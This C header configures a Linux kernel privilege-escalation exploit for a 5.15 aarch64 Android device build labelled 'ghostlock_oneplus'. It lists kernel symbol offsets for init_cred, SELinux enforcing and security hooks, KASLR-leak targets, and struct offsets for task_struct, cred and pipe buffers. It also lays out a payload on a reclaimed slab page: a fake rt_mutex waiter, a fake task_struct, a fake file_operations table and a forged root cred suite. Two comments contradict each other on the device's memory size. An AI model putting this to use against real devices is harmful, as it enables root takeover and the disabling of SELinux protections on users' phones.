#ifndef TARGET_H
#define TARGET_H

#define BUILD_VARIANT_LABEL "ghostlock_oneplus"
#define BUILD_FINGERPRINT "oneplus/ghostlock"

/* Kernel address space (VA_BITS=39) */
#define KIMAGE_TEXT_BASE 0xffffffc080000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0xa8000000ULL
/* physmap on this SoC spans ~48GB (DDR ranks at high phys addrs) */
/* Amlogic S905X3: 2GB RAM at phys 0x0-0x80000000.
 * Linear map: 0xffffff8000000000 to 0xffffff8080000000. */
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END   0xffffff8080000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

/* Global symbol offsets (kallsyms) */
#define INIT_TASK_OFF          0x0240cf00ULL
#define INIT_CRED_OFF          0x02422c70ULL
#define INIT_UTS_NS_OFF        0x02594d88ULL
#define EMPTY_ZERO_PAGE_OFF    0x02635000ULL
#define ROOT_TASK_GROUP_OFF    0x0263d580ULL
#define SELINUX_ENFORCING_OFF  0x026894d0ULL
#define KPTR_RESTRICT_OFF      0x0240b638ULL
#define CAP_CAPABLE_ACTIVE_OFF 0x02683b30ULL
#define KPTR_RESTRICT          (KIMAGE_TEXT_BASE + KPTR_RESTRICT_OFF)
#define SELINUX_BLOB_SIZES_OFF 0x018464e8ULL
#define SECURITY_HOOK_HEADS_OFF 0x01846480ULL
#define KMALLOC_CACHES_OFF     0x018404c0ULL
#define ANON_PIPE_BUF_OPS_OFF  0x0121ee48ULL
/* UMH root: workqueue symbol offsets (0 = not available, set per-device) */
#define SYSTEM_UNBOUND_WQ_OFF              0ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF   0ULL
#define CONFIGFS_READ_ITER_OFF      0x005154acULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x005156e0ULL
#define COPY_SPLICE_READ_OFF   0x00491578ULL
#define NOOP_LLSEEK_OFF        0x0043e8f4ULL
#define ASHMEM_MISC_FOPS_OFF   0x0133b058ULL
#define ASHMEM_FOPS_OFF        0x026b6a98ULL
#define ASHMEM_IOCTL_OFF       0x00d85964ULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x00d85834ULL
#define ASHMEM_MMAP_OFF        0x00d858b0ULL
#define ASHMEM_OPEN_OFF        0x00d854b4ULL
#define ASHMEM_RELEASE_OFF     0x00d85a04ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x00d8580cULL

/* KASLR leak */
#define SLIDE_NFULNL_LOGGER_OFF       0x024021a0ULL
#define SLIDE_LOGGERS_0_1_OFF         0x024020f0ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x026aa868ULL
#define SLIDE_SYSCTL_BOOTID_OFF       0x026aa868ULL

/* Derived macros */
#define INIT_TASK           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_CRED           (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define INIT_UTS_NS         (KIMAGE_TEXT_BASE + INIT_UTS_NS_OFF)
#define EMPTY_ZERO_PAGE     (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)
#define ROOT_TASK_GROUP     (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING   (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SELINUX_BLOB_SIZES  (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES      (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS   (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define ASHMEM_MISC_FOPS    (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS         (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL        (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP         (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN         (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE      (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO  (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER      (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ    (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK         (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define SLIDE_NFULNL_LOGGER_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE         (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE     (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* 5.15: do_futex frame 0x1f0, waiter at sp+0x48; select frame 0x1c0, fds at sp+0x70.
 * waiter_word = (0x48 + 0x30 - 0x70) / 8 = 1. Shift from 6.12's word 0. */
#define PSELECT_WAITER_WORD_SHIFT 1

/* Struct field offsets (BTF verified) */
#define WAITER_LOCAL_OFF          0x80
#define WAITER_TREE_ENTRY_OFF     0x00
#define WAITER_PI_TREE_ENTRY_OFF  0x28
#define WAITER_TASK_OFF           0x50
#define WAITER_LOCK_OFF           0x58
#define WAITER_WAKE_STATE_OFF     0x60
#define WAITER_PRIO_OFF           0x18
#define WAITER_DEADLINE_OFF       0x20
#define WAITER_WW_CTX_OFF         0x68

#define FAKE_WAITER_TREE_PRIO_OFF         0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF     0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF     0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF      0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF  0x48
#define FAKE_WAITER_TASK_OFF              0x50
#define FAKE_WAITER_LOCK_OFF              0x58
#define FAKE_WAITER_WAKE_STATE_OFF        0x60
#define FAKE_WAITER_WW_CTX_OFF            0x68

/* 5.15 aarch64 task_struct offsets (verified via vmlinux disassembly +
 * init_task dump: stack@0x38, usage@0x40 (=REFCOUNT_INIT(2)), flags@0x44,
 * prio@0x7C, normal_prio@0x84, pi_lock@0x8E4, pi_top_task@0x908,
 * pi_blocked_on@0x910; sabrina pahole: pi_waiters@0x8F8) */
#define FAKE_TASK_USAGE_OFF          0x40
#define FAKE_TASK_PRIO_OFF           0x7C
#define FAKE_TASK_NORMAL_PRIO_OFF    0x84
#define FAKE_TASK_TASK_GROUP_OFF     0x340
#define FAKE_TASK_PI_LOCK_OFF        0x8E4
#define FAKE_TASK_PI_WAITERS_OFF     0x8F8
#define FAKE_TASK_PI_TOP_TASK_OFF    0x908
#define FAKE_TASK_PI_BLOCKED_ON_OFF  0x910

#define MM_OWNER_OFF             0x410
#define TASK_PID_OFF             0x708
#define TASK_TGID_OFF            0x70c
#define TASK_REAL_PARENT_OFF     0x718
#define TASK_ATOMIC_FLAGS_OFF    0x6c8
#define TASK_REAL_CRED_OFF       0x8f8
#define TASK_CRED_OFF            0x900
#define TASK_COMM_OFF            0x910
#define TASK_TASKS_OFF           0x638
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF         0x9c8

#define CRED_UID_OFF         8
#define CRED_SECUREBITS_OFF  40
#define CRED_CAPS_OFF        48
#define CRED_SECURITY_OFF    128
#define SELINUX_CRED_BLOB_OFF  0
#define SELINUX_CRED_OSID_OFF  0
#define SELINUX_CRED_SID_OFF   4
#define SECCOMP_MODE_OFF          0x00
#define SECCOMP_FILTER_COUNT_OFF  0x04
#define SECCOMP_FILTER_OFF        0x08
#define TIF_SECCOMP_BIT           11
#define PFA_NO_NEW_PRIVS_BIT      0

#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF         0x08
#define STRUCT_PAGE_TYPE_OFF          0x30

#define PIPE_BUFFER_SIZE         0x28
#define PIPE_BUFFER_SLOTS        32
#define PIPE_BUF_FLAG_CAN_MERGE  0x10
#define PIPE_INODE_INFO_STRUCT_SIZE   0xb8
#define PIPE_INODE_INFO_SIZE          0xc0
#define PIPE_INODE_INFO_SLOTS_PER_PAGE 21
#define PIPE_HEAD_OFF                 0x60
#define PIPE_TAIL_OFF                 0x64
#define PIPE_MAX_USAGE_OFF            0x68
#define PIPE_RING_SIZE_OFF            0x6c
#define PIPE_NR_ACCOUNTED_OFF         0x70
#define PIPE_READERS_OFF              0x74
#define PIPE_WRITERS_OFF              0x78
#define PIPE_FILES_OFF                0x7c
#define PIPE_TMP_PAGE_OFF             0x90
#define PIPE_BUFS_OFF                 0xa8
#define PIPE_USER_OFF                 0xb0

#define FOPS_OWNER_OFF        0x00
#define FOPS_LLSEEK_OFF       0x10
#define FOPS_READ_OFF         0x18
#define FOPS_WRITE_OFF        0x20
#define FOPS_READ_ITER_OFF    0x28
#define FOPS_WRITE_ITER_OFF   0x30
#define FOPS_IOCTL_OFF        0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF         0x60
#define FOPS_OPEN_OFF         0x68
#define FOPS_RELEASE_OFF      0x78
#define FOPS_SPLICE_READ_OFF  0xb8
#define FOPS_SHOW_FDINFO_OFF  0xd8

/* --- payload layout: MUST fit in the 8KB order-1 mm slab page ---
 * (the reclaimed mm page is order 1 = 8KB; everything the chain walk
 *  dereferences is placed below 0x2000). The values are otherwise free:
 *  only the kernel-struct-relative field offsets (FOPS_*, WAITER_*,
 *  FAKE_TASK_* / CRED15_*) are fixed by the kernel ABI. */
#define LOCK_OFF      0x0100  /* fake rt_mutex_base (rt_mutex) */
#define CAL_LOCK_COPY_OFF 0x0140 /* second fake_lock layout (identity test):
                                  * wait_lock=0, waiters={&W0,&W0},
                                  * owner=fake_task|1; point CAL_LOCK_REL here
                                  * to verify the walk lands in OUR mapping */
#define W0_OFF        0x0180  /* fake rt_mutex_waiter W0 */
#define RIGHT_OFF     0x01E0
#define LEFT_OFF      0x0200
#define FOPS_OFF      0x0240  /* fake file_operations table */
#define CRED_COPY_OFF 0x0340  /* init_cred copy for write 2 */
#define SCRATCH_OFF   0x0400
#define FAKE_TASK_OFF 0x0480  /* fake task_struct (fields up to +0x910) */
#define CFG_PAGE_OFF            16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF      88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF     100

/* ===== 5.15.170 aarch64 GKI struct layouts (verified via vmlinux disassembly) ===== */
/* struct cred: usage is 32-bit atomic_t, uid at +4 (prepare_creds: str w1,[x19];
 * getuid: ldr w8,[cred,#4]; euid at 0x14; cap_effective at 0x38 (cap_capable);
 * security at 0x78 (selinux_capable); user_ns at 0x88; sizeof = 0xB0) */
#define CRED15_USAGE_OFF     0x00
#define CRED15_UID_OFF       0x04
#define CRED15_GID_OFF       0x08
#define CRED15_SUID_OFF      0x0C
#define CRED15_SGID_OFF      0x10
#define CRED15_EUID_OFF      0x14
#define CRED15_EGID_OFF      0x18
#define CRED15_FSUID_OFF     0x1C
#define CRED15_FSGID_OFF     0x20
#define CRED15_SECUREBITS_OFF 0x24
#define CRED15_CAP_INH_OFF   0x28
#define CRED15_CAP_PRM_OFF   0x30
#define CRED15_CAP_EFF_OFF   0x38
#define CRED15_CAP_BSET_OFF  0x40
#define CRED15_CAP_AMB_OFF   0x48
#define CRED15_JIT_KEYRING_OFF 0x50
#define CRED15_SESSION_KEYRING_OFF 0x58
#define CRED15_PROCESS_KEYRING_OFF 0x60
#define CRED15_THREAD_KEYRING_OFF 0x68
#define CRED15_REQUEST_KEY_AUTH_OFF 0x70
#define CRED15_SECURITY_OFF  0x78
#define CRED15_USER_OFF      0x80
#define CRED15_USER_NS_OFF   0x88
#define CRED15_UCOUNTS_OFF   0x90
#define CRED15_GROUP_INFO_OFF 0x98
#define CRED15_SIZE          0xB0

/* task_struct (sabrina pahole + disasm): real_cred=0x7F0, cred=0x7F8 */
#define TASK15_REAL_CRED_OFF 0x7F0
#define TASK15_CRED_OFF      0x7F8

/* Fake-cred suite on the reclaim page (8KB order-1 page; fake_task spans
 * 0x480..0xD90, the suite lives above it) */
#define FAKE_CRED_OFF        0x0E00  /* struct cred (0xB0) */
#define FAKE_SEC_BLOB_OFF    0x0EC0  /* task_security_struct {osid,sid,...} */
#define FAKE_USER_STRUCT_OFF 0x0F00  /* struct user_struct */
#define FAKE_UCOUNTS_OFF     0x0F80  /* struct ucounts */
/* group_info moved to page 0 (was 0x1100): under the MOVABLE-storm
 * capture the mm page's four base pages scatter into different user
 * pages, so only the first 4KB of the layout is reliably present - and
 * exec's prepare_creds() reads group_info. 0xDB0 sits in the free gap
 * between fake_task->pi_blocked_on (ends 0xD98) and FAKE_CRED (0xE00). */
#define FAKE_GROUP_INFO_OFF  0x0DB0
#define FAKE_USER_NS_OFF     0x1200  /* fake user_namespace (exec path only: 
                                  * fake ucounts->ns terminator + ucount_max;
                                  * NOT present under storm capture - storm
                                  * runs are no-exec) */
#define SELFTEST_OFF         0x1F00  /* rb_erase write target for self-test */
#define SELFTEST_VALUE       0x1F10  /* marker written into SELFTEST_OFF */

#endif

/* SLIDE mode pselect shift (pselect vs select stack frame diff 16B = 2 words) */
#define SLIDE_PSELECT_WORD_SHIFT 2
#define SLIDE_PSELECT_NFDS 1024
#define SLIDE_USE_SELECT 0
